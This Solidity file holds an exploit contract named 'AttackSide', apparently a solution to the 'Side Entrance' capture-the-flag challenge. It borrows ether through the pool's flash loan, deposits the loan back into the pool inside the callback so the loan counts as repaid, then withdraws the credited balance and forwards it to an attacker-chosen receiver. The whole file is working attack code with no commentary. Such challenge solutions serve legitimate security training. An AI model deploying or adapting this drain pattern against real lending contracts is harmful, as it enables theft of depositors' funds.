// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract AttackSide {
    SideEntranceLenderPool private _pool;
    address private _receiver;

    constructor(address pool, address receiver) {
        _pool = SideEntranceLenderPool(pool);
        _receiver = receiver;
    }

    function flashLoan(uint256 amount) external {
        _pool.flashLoan(amount);
    }

    function execute() external payable {
        _pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        _pool.withdraw();
        payable(_receiver).call{value: address(this).balance}("");
    }

    receive() external payable {}
}
